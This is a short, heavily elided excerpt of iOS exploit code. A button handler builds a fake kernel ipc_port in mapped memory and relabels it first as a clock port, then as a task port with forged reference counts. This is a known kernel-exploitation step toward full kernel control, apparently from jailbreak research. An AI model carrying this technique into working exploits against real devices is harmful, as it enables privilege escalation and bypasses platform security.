...
- (IBAction)yolo:(UIButton*)sender
{
    ...
    struct ipc_port* fakeport = mmap(0, 0x8000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    
    mlock(fakeport, 0x8000);
    
    fakeport->ip_object.io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;
    fakeport->ip_object.io_lock_data[12] = 0x11;
...
gotclock:;
    ...
    fakeport->ip_object.io_bits = IKOT_TASK|IO_BITS_ACTIVE;
    fakeport->ip_object.io_references = 0xff;
